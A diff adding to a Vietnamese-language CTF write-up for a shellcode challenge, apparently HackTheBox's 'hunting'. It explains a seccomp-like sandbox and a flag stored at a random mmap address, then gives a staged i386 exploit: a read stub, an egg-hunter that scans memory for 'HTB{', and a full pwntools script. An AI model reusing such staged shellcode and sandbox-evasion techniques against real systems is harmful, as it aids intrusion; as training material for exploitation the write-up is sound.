@@ -14,4 +14,140 @@ Chương trình cho phép nhập shellcode và thực thi.
 <img width="845" height="425" alt="image" src="https://github.com/user-attachments/assets/3a44f0a5-c519-4d32-9369-6e10e3237cdf" />
 
 - Không thể gọi tạo shell do các hàm tạo tiến trình đều bị chặn.
--
+- Không thể đọc flag vì các hàm mwor file cũng bị chặn.
+
+Tuy nhiên trong chương trình chứa sẵn flag. 
+
+<img width="731" height="260" alt="image" src="https://github.com/user-attachments/assets/576a3e53-8ba3-4708-a21c-8b90bb07ba56" />
+<img width="520" height="281" alt="image" src="https://github.com/user-attachments/assets/c642bc0a-d4fa-49b2-a2cb-151643fd9c3e" />
+
+Chuỗi flag *"HTB{...}"* này được lưu vào  biến `dest` được tạo ra bởi hàm `random_addr`.
+
+<img width="622" height="320" alt="image" src="https://github.com/user-attachments/assets/23051bab-484a-42de-b939-73e777c98002" />
+
+Hàm này tạo ra một số ngẫu nhiên rồi dịch 16 BITS đến khi tạo ra được 1 địa chỉ lớn hơn bằng 0x5FFFFFFF.
+
+Khi địa chỉ này được đưa vào `mmap` thì sẽ căn chỉnh sao để địa chỉ đó chia hết cho 0x1000 (do cơ chế cấp phát bộ nhớ theo trang của hệ điều hành).
+
+# Khai thác
+
+Ý tưởng là sử dụng các dấu hiệu đặc trưng của flag như có chuỗi *"HTB{"* và có địa chỉ từ 0x60000000 trở đi để tìm vị trí của flag trong chương trình.
+
+Vì 0x3c (60 BTYES) không đủ viết shellcode *egg hunter* nên cần gọi hàm `read` để nhập payload lớn hơn:
+
+    shellcode1=asm('''
+    	mov eax, 3
+    	xor ebx, ebx
+    	mov edx, 0x400
+    	int 0x80
+    	''', arch='i386')
+    p.send(shellcode1.ljust(0x3c,b'B'))
+
+Bây giờ tạo 1 vòng lặp đi từ địa chỉ 0x60000000 về sau để tìm xem địa chỉ nào hợp lệ để đọc (giá trị trả về eax khác 0xfffffff2). Với địa chỉ nào hợp lệ thì truy cập xem nếu đủ các kí tự *"HTB{"* thì in ra màn hình.
+
+### Egg hunter:
+
+    shellcode2=asm('''
+    	init:
+    		mov edi,0x60000000
+    
+    	run:
+    		mov eax, 4
+    		mov ebx, 1
+    		mov ecx, edi
+    		mov edx, 1
+    		int 0x80
+    		cmp al,0xf2
+    		je next_page
+    		jmp check
+    
+    	next_page:
+    		add edi,0x1000
+    		jmp run
+    
+    	check:
+    		mov al, [edi+0]
+    		cmp al, 'H'
+    		jne next_page
+    		mov al, [edi+1]
+    		cmp al, 'T'
+    		jne next_page
+    		mov al, [edi+2]
+    		cmp al, 'B'
+    		jne next_page
+    		mov al, [edi+3]
+    		cmp al, '{'
+    		jne next_page
+    
+    		mov eax, 4
+    		mov ebx, 1
+    		mov ecx, edi
+    		mov edx, 0x100
+    		int 0x80
+    		''', arch='i386')
+    
+    p.send(b'A'*0x3c+shellcode2)
+
+# Script python
+
+    #!/usr/bin/env python3
+    from pwn import *
+    context.binary=exe=ELF('./hunting',checksec=False)
+    p=process(exe.path)
+    
+    gdb.attach(p,gdbscript='''
+    	b*0x5655654a
+    	c
+    	'''
+    )
+    
+    shellcode1=asm('''
+    	mov eax, 3
+    	xor ebx, ebx
+    	mov edx, 0x400
+    	int 0x80
+    	''', arch='i386')
+    
+    #0x60000000
+    shellcode2=asm('''
+    	init:
+    		mov edi,0x60000000
+    
+    	run:
+    		mov eax, 4
+    		mov ebx, 1
+    		mov ecx, edi
+    		mov edx, 1
+    		int 0x80
+    		cmp al,0xf2
+    		je next_page
+    		jmp check
+    
+    	next_page:
+    		add edi,0x1000
+    		jmp run
+    
+    	check:
+    		mov al, [edi+0]
+    		cmp al, 'H'
+    		jne next_page
+    		mov al, [edi+1]
+    		cmp al, 'T'
+    		jne next_page
+    		mov al, [edi+2]
+    		cmp al, 'B'
+    		jne next_page
+    		mov al, [edi+3]
+    		cmp al, '{'
+    		jne next_page
+    
+    		mov eax, 4
+    		mov ebx, 1
+    		mov ecx, edi
+    		mov edx, 0x100
+    		int 0x80
+    		''', arch='i386')
+    
+    p.send(shellcode1.ljust(0x3c,b'B')+b'A'*0x3c+shellcode2)
+    
+    p.interactive()
